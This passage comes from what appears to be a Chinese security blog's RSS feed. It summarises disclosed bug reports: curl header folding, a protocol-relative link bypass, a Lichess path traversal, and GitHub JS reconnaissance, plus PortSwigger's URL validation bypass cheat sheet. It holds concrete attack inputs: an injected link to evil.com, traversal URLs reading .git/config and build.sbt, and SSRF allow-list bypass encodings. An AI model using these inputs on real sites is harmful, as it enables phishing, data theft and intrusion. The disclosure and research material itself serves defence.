&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;--proxy 127.0.0.1:8080
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;代理依赖&lt;/strong&gt;：该行为仅在使用&lt;code&gt;--proxy&lt;/code&gt;参数时出现&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;头部格式要求&lt;/strong&gt;：注入需要满足&lt;code&gt;&amp;quot;[space]something:value&amp;quot;&lt;/code&gt;格式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;协议限制&lt;/strong&gt;：仅影响HTTPS请求&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件输入&lt;/strong&gt;：同样适用于&lt;code&gt;-H @file.txt&lt;/code&gt;形式（文件内容以空格开头）&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;影响分析&#34;&gt;影响分析
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;可能导致服务器端错误日志记录&lt;/li&gt;
&lt;li&gt;可能被用于构造畸形请求&lt;/li&gt;
&lt;li&gt;当攻击者能控制输入文件或单个头字段时存在潜在风险&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;官方回应&#34;&gt;官方回应
&lt;/h2&gt;&lt;p&gt;curl团队认为这是文档化行为（HTTP/1头部折叠特性），但报告人通过自定义代理测试表明：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;无效头部（如&lt;code&gt;-H &amp;quot;[space]abc&amp;quot;&lt;/code&gt;）会被curl直接丢弃&lt;/li&gt;
&lt;li&gt;头部拼接行为似乎由curl而非代理实现&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;相关讨论&#34;&gt;相关讨论
&lt;/h2&gt;&lt;p&gt;报告人提供了Python代理测试代码，证明头部处理行为确实发生在curl层面：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;socket&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;threading&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PROXY_HOST&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PROXY_PORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8081&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;handle_client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4096&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;=== HTTP Request Received ===&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;errors&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;replace&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;=============================&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;client_socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;最终状态&#34;&gt;最终状态
&lt;/h2&gt;&lt;p&gt;报告被标记为&amp;quot;Not Applicable&amp;quot;，但披露以供社区参考。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>URL验证绕过速查表：全面解析SSRF与CORS绕过技术</title>
        <link>http://localhost:1313/p/url%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90ssrf%E4%B8%8Ecors%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Sun, 03 Aug 2025 10:41:06 +0800</pubDate>
        
        <guid>http://localhost:1313/p/url%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90ssrf%E4%B8%8Ecors%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h1 id=&#34;引入url验证绕过速查表&#34;&gt;引入URL验证绕过速查表
&lt;/h1&gt;&lt;p&gt;URL验证绕过是众多漏洞的根本原因，包括许多SSRF（服务器端请求伪造）、CORS（跨源资源共享）配置错误和开放重定向实例。这些漏洞通过使用模糊URL触发URL解析差异并绕过验证。然而，许多这些技术由于缺乏文档而被忽视。为了解决这个问题，我们创建了一个速查表，整合所有已知的有效载荷，节省您从互联网上搜索和收集信息的时间和精力。今天，我们很高兴推出一个新工具：URL验证绕过速查表。&lt;/p&gt;
&lt;p&gt;我们希望您觉得它有用！这是一个频繁更新的存储库，包含所有已知技术，让您快速生成符合需求的单词列表。&lt;/p&gt;
&lt;h2 id=&#34;如何开始使用&#34;&gt;如何开始使用
&lt;/h2&gt;&lt;p&gt;URL验证绕过速查表是一个全新的交互式Web应用程序，根据您的上下文自动调整其设置。目前有三种上下文可用：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;完全限定的绝对URL&lt;/strong&gt; - 适用于URL用于请求查询参数等情况。所有有效载荷都设计为与Burp Suite Intruder兼容，因此您无需担心正确的编码。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;仅主机名&lt;/strong&gt; - 直接输入域名，例如在Host头值中。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CORS Origin&lt;/strong&gt; - 主机名用于有效的浏览器Origin头。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;最初，速查表提供六种类型的有效载荷单词列表。高级设置允许您选择特定的单词列表或同时使用所有列表。以下是最重要的一些概述：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;域名允许列表绕过&lt;/strong&gt;：专为域名混淆攻击设计。您可以通过输入允许的域名和攻击者域名来自定义测试域名。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;伪造相对URL&lt;/strong&gt;：包括浏览器有效的绝对URL，这些URL可能会被客户端代码错误地验证。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;环回地址&lt;/strong&gt;：此单词列表包括IPv4、IPv6地址的各种表示及其规范化。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;编码&#34;&gt;编码
&lt;/h2&gt;&lt;p&gt;URL验证速查表支持几种类型的字符串编码：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Intruder的百分比编码&lt;/strong&gt;：此选项通过将某些字符替换为代表字符UTF-8编码的一到四个转义序列来编码有效载荷字符串。它排除了Burp Suite Intruder的默认字符，并默认启用，使其与Burp Suite轻松兼容。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;全部编码&lt;/strong&gt;：此选项对所有非字母数字字符进行百分比编码。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特殊字符&lt;/strong&gt;：编码除以下字符之外的所有字符：&lt;code&gt;[&amp;quot;!&amp;quot;,&amp;quot;$&amp;quot;,&amp;quot;&#39;&amp;quot;,&amp;quot;\&amp;quot;&amp;quot;,&amp;quot;(&amp;quot;,&amp;quot;)&amp;quot;,&amp;quot;*&amp;quot;,&amp;quot;,&amp;quot;,&amp;quot;-&amp;quot;,&amp;quot;.&amp;quot;,&amp;quot;/&amp;quot;,&amp;quot;\\&amp;quot;,&amp;quot;:&amp;quot;,&amp;quot;;&amp;quot;,&amp;quot;[&amp;quot;,&amp;quot;]&amp;quot;,&amp;quot;^&amp;quot;,&amp;quot;_&amp;quot;,&amp;quot;{&amp;quot;,&amp;quot;}&amp;quot;,&amp;quot;|&amp;quot;,&amp;quot;~&amp;quot;]&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Unicode转义&lt;/strong&gt;：此选项将有效载荷字符串表示为六字符转义序列&lt;code&gt;\uXXXX&lt;/code&gt;，除了以下字符：&lt;code&gt;[&#39;&amp;quot;&#39;,&#39;\\&#39;,&#39;\b&#39;,&#39;\f&#39;,&#39;\n&#39;,&#39;\r&#39;,&#39;\t&#39;]&lt;/code&gt;和范围&lt;code&gt;[0x0020 - 0x007f]&lt;/code&gt;内的字符。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：未编码的字符串应谨慎使用，因为Unicode值可能无法正确传输。&lt;/p&gt;
&lt;h2 id=&#34;高级设置&#34;&gt;高级设置
&lt;/h2&gt;&lt;h3 id=&#34;ipv4地址表示&#34;&gt;IPv4地址表示
&lt;/h3&gt;&lt;p&gt;在处理Web应用程序时，将IP地址编码为不同格式对于测试、验证和安全目的至关重要。速查表支持标准IPv4地址作为攻击者IP输入，并返回一系列编码表示，包括八进制、十六进制、二进制和十进制格式。它还将IPv4地址转换为其IPv6映射地址格式。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;编码细节&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;八进制&lt;/strong&gt;：IP地址的每个段转换为八进制数并填充到4位。例如，环回IP地址&lt;code&gt;127.0.0.1&lt;/code&gt;将表示为&lt;code&gt;0177.0000.0000.0001&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;十六进制&lt;/strong&gt;：每个段转换为十六进制数，前缀为&lt;code&gt;0x&lt;/code&gt;，并填充到2位。相同的环回IP地址将为&lt;code&gt;0x7F.0x00.0x00.0x01&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;二进制&lt;/strong&gt;：每个段转换为8位二进制数。示例IP地址将为&lt;code&gt;01111111.00000000.00000000.00000001&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;部分十进制&lt;/strong&gt;：将IP地址的第三和第四部分组合成一个十进制数：&lt;code&gt;127.0.1&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;DWORD表示法&lt;/strong&gt;：整个IP地址转换为无符号32位整数：&lt;code&gt;2130706433&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;带溢出的DWORD表示法&lt;/strong&gt;：将先前转换的结果加上&lt;code&gt;2^32 * 10 = 45080379393&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IPv6映射地址&lt;/strong&gt;：将IPv4段转换为十六进制并格式化为标准IPv6映射地址。环回IP地址可以表示为&lt;code&gt;[::FFFF:7F00:0001]&lt;/code&gt;或&lt;code&gt;::FFFF:127.0.0.1&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;规范化&#34;&gt;规范化
&lt;/h3&gt;&lt;p&gt;单词列表包括许多利用Unicode字符串规范化的有效载荷。例如，以下字符的规范化会导致空字符串：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ZeroWidthSpace&lt;/code&gt;、&lt;code&gt;NegativeVeryThinSpace&lt;/code&gt;、&lt;code&gt;NegativeThinSpace&lt;/code&gt;、&lt;code&gt;NegativeMediumSpace&lt;/code&gt;、&lt;code&gt;NegativeThickSpace&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Word Joiner (U+2060)&lt;/code&gt;（&lt;code&gt;&amp;amp;NoBreak;&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Soft Hyphen Character U+00AD&lt;/code&gt;（&lt;code&gt;&amp;amp;shy;&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些技术可用于绕过Web应用程序防火墙（WAF）。另一个允许域名绕过的例子是当验证正则表达式允许多行字符串时。例如，如果使用正则表达式&lt;code&gt;^allowed_domain$&lt;/code&gt;，以下内容可以绕过验证：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;attacker_domain(U+2028)allowed_domain&lt;/code&gt;（行分隔符）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;attacker_domain(U+2029)allowed_domain&lt;/code&gt;（段落分隔符）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;致谢&#34;&gt;致谢
&lt;/h2&gt;&lt;p&gt;这个速查表离不开分享研究的Web安全社区。特别感谢：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Gareth Heyes、&lt;/li&gt;
&lt;li&gt;James Kettle、&lt;/li&gt;
&lt;li&gt;Jann Horn、&lt;/li&gt;
&lt;li&gt;Liv Matan、&lt;/li&gt;
&lt;li&gt;Takeshi Terada、&lt;/li&gt;
&lt;li&gt;Orange Tsai、&lt;/li&gt;
&lt;li&gt;Nicolas Grégoire。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们在GitHub账户上发布了所有有效载荷：&lt;a class=&#34;link&#34; href=&#34;https://github.com/PortSwigger/url-cheatsheet-data&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://github.com/PortSwigger/url-cheatsheet-data&lt;/a&gt;，您可以通过创建新问题或更新JSON文件并提交拉取请求来为此速查表做出贡献。&lt;/p&gt;
&lt;p&gt;我们期待您使用我们的新URL验证绕过速查表发现有趣的内容！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>利用协议相对URL(//)绕过个人简介&#34;禁止链接&#34;限制的技术分析</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%AF%B9url/%E7%BB%95%E8%BF%87%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B%E7%A6%81%E6%AD%A2%E9%93%BE%E6%8E%A5%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 09:28:54 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%AF%B9url/%E7%BB%95%E8%BF%87%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B%E7%A6%81%E6%AD%A2%E9%93%BE%E6%8E%A5%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;绕过禁止链接限制的技术分析报告&#34;&gt;绕过&amp;quot;禁止链接&amp;quot;限制的技术分析报告
&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
&lt;/h2&gt;&lt;p&gt;在addons.allizom.org平台的个人简介编辑功能中，虽然系统明确声明&amp;quot;Links are forbidden&amp;quot;（禁止链接），但攻击者可以通过协议相对URL语法&lt;code&gt;&amp;lt;a href=&amp;quot;//evil.com&amp;quot;&amp;gt;click&amp;lt;/a&amp;gt;&lt;/code&gt;成功植入可点击的超链接。这违反了应用声明的安全策略，可能被用于钓鱼攻击、恶意软件传播等场景。&lt;/p&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;h3 id=&#34;漏洞复现步骤&#34;&gt;漏洞复现步骤
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;登录 &lt;a class=&#34;link&#34; href=&#34;https://addons.allizom.org&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://addons.allizom.org&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;进入个人资料编辑页面&lt;/li&gt;
&lt;li&gt;在个人简介字段插入Payload：&lt;code&gt;&amp;lt;a href=&amp;quot;//evil.com&amp;quot;&amp;gt;click&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;保存后，点击生成的&amp;quot;click&amp;quot;链接将跳转到http://evil.com/&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;限制绕过原理&#34;&gt;限制绕过原理
&lt;/h3&gt;&lt;p&gt;系统未正确过滤协议相对URL（以双斜杠&amp;quot;//&amp;ldquo;开头的URL），这种URL会继承当前页面的协议（HTTP/HTTPS）。相比完整URL，协议相对URL能绕过简单的链接检测机制。&lt;/p&gt;
&lt;h2 id=&#34;影响评估&#34;&gt;影响评估
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;违反应用声明的安全策略，破坏用户信任&lt;/li&gt;
&lt;li&gt;攻击者可嵌入：
&lt;ul&gt;
&lt;li&gt;钓鱼网站链接&lt;/li&gt;
&lt;li&gt;恶意软件下载地址&lt;/li&gt;
&lt;li&gt;社会工程攻击载体&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;官方回应&#34;&gt;官方回应
&lt;/h2&gt;&lt;p&gt;Mozilla安全团队确认：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;该限制主要为防垃圾信息而非安全控制&lt;/li&gt;
&lt;li&gt;漏洞评级为&amp;quot;低危&amp;rdquo;&lt;/li&gt;
&lt;li&gt;根本原因是&amp;quot;Improper Input Validation&amp;quot;（输入验证不充分）&lt;/li&gt;
&lt;li&gt;已向报告者发放漏洞奖金&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2025-06-03 漏洞提交&lt;/li&gt;
&lt;li&gt;2025-06-13 确认为有效漏洞并修复&lt;/li&gt;
&lt;li&gt;2025-07-29 公开披露&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>通过GitHub进行JavaScript侦察：在访问应用前发现敏感信息</title>
        <link>http://localhost:1313/p/%E9%80%9A%E8%BF%87github%E8%BF%9B%E8%A1%8Cjavascript%E4%BE%A6%E5%AF%9F%E5%9C%A8%E8%AE%BF%E9%97%AE%E5%BA%94%E7%94%A8%E5%89%8D%E5%8F%91%E7%8E%B0%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/</link>
        <pubDate>Sun, 03 Aug 2025 09:01:24 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%80%9A%E8%BF%87github%E8%BF%9B%E8%A1%8Cjavascript%E4%BE%A6%E5%AF%9F%E5%9C%A8%E8%AE%BF%E9%97%AE%E5%BA%94%E7%94%A8%E5%89%8D%E5%8F%91%E7%8E%B0%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/</guid>
        <description>&lt;p&gt;“大多数敏感信息并不在前端——它们隐藏在版本控制的坟墓中。”&lt;/p&gt;
&lt;h3 id=&#34;-github为何是js侦察的金矿&#34;&gt;⚡ GitHub为何是JS侦察的金矿
&lt;/h3&gt;&lt;p&gt;现代Web应用通常由庞大的前端JavaScript包驱动——这些文件通过CDN分发、嵌入HTML或由现代框架（React、Vue、Angular）构建。而这些JS文件并非凭空产生。&lt;/p&gt;
&lt;p&gt;它们诞生、演变并在GitHub仓库中被意外错误配置——这正是价值所在。因此，与其从Burp或浏览器开发者工具开始，您可以直接从源头GitHub展开侦察。&lt;/p&gt;
&lt;h3 id=&#34;-在github进行js侦察时的关键目标&#34;&gt;🔍 在GitHub进行JS侦察时的关键目标
&lt;/h3&gt;&lt;h4 id=&#34;1-泄露的内部js文件&#34;&gt;1️⃣ 泄露的内部JS文件
&lt;/h4&gt;&lt;p&gt;重点查找：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;admin.js&lt;/code&gt;, &lt;code&gt;internal.js&lt;/code&gt;, &lt;code&gt;beta.js&lt;/code&gt;, &lt;code&gt;staging.bundle.js&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;debug.js&lt;/code&gt;, &lt;code&gt;test.js&lt;/code&gt;, &lt;code&gt;monitor.js&lt;/code&gt;, &lt;code&gt;analytics.js&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些文件通常包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未在生产环境暴露的内部API路径&lt;/li&gt;
&lt;li&gt;功能开关&lt;/li&gt;
&lt;li&gt;暴露逻辑路径的JS条件语句（例如&lt;code&gt;if (user.isAdmin)&lt;/code&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;2-暴露的端点&#34;&gt;2️⃣ 暴露的端点
&lt;/h4&gt;&lt;p&gt;检查以下调用内部：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;axios.get&lt;/code&gt;, &lt;code&gt;fetch()&lt;/code&gt;, &lt;code&gt;$.ajax&lt;/code&gt;, &lt;code&gt;XMLHttpRequest&lt;/code&gt;或自定义&lt;code&gt;apiClient.get&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Lila项目路径遍历漏洞分析：从漏洞发现到修复全过程</title>
        <link>http://localhost:1313/p/lila%E9%A1%B9%E7%9B%AE%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%8E%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%88%B0%E4%BF%AE%E5%A4%8D%E5%85%A8%E8%BF%87%E7%A8%8B/</link>
        <pubDate>Sun, 03 Aug 2025 08:33:48 +0800</pubDate>
        
        <guid>http://localhost:1313/p/lila%E9%A1%B9%E7%9B%AE%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%8E%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%88%B0%E4%BF%AE%E5%A4%8D%E5%85%A8%E8%BF%87%E7%A8%8B/</guid>
        <description>&lt;h1 id=&#34;lichess漏洞报告3181066---lila项目路径遍历漏洞&#34;&gt;Lichess漏洞报告#3181066 - Lila项目路径遍历漏洞
&lt;/h1&gt;&lt;h2 id=&#34;漏洞摘要&#34;&gt;漏洞摘要
&lt;/h2&gt;&lt;p&gt;在Lila项目中发现一个路径遍历漏洞，攻击者可通过操纵用户输入来访问服务器上的任意文件，突破预期目录结构限制。该漏洞可能暴露应用源代码、配置文件等敏感信息。&lt;/p&gt;
&lt;h2 id=&#34;复现步骤&#34;&gt;复现步骤
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;通过构造特殊URL访问受限文件：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://lichess.org/assets/../build.sbt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://lichess.org/assets/../.git/config
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;漏洞影响&#34;&gt;漏洞影响
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;任意文件读取：可能泄露.git配置、应用配置(含密钥/凭证)、服务端源码&lt;/li&gt;
&lt;li&gt;信息泄露：暴露内部逻辑、部署细节、管理员配置&lt;/li&gt;
&lt;li&gt;间接提权：通过读取访问控制相关文件可能衍生其他攻击&lt;/li&gt;
&lt;li&gt;攻击侦察：了解内部文件结构有助于发现RCE或IDOR等漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;修复过程&#34;&gt;修复过程
&lt;/h2&gt;&lt;p&gt;开发团队采用Nginx配置修复方案：&lt;/p&gt;
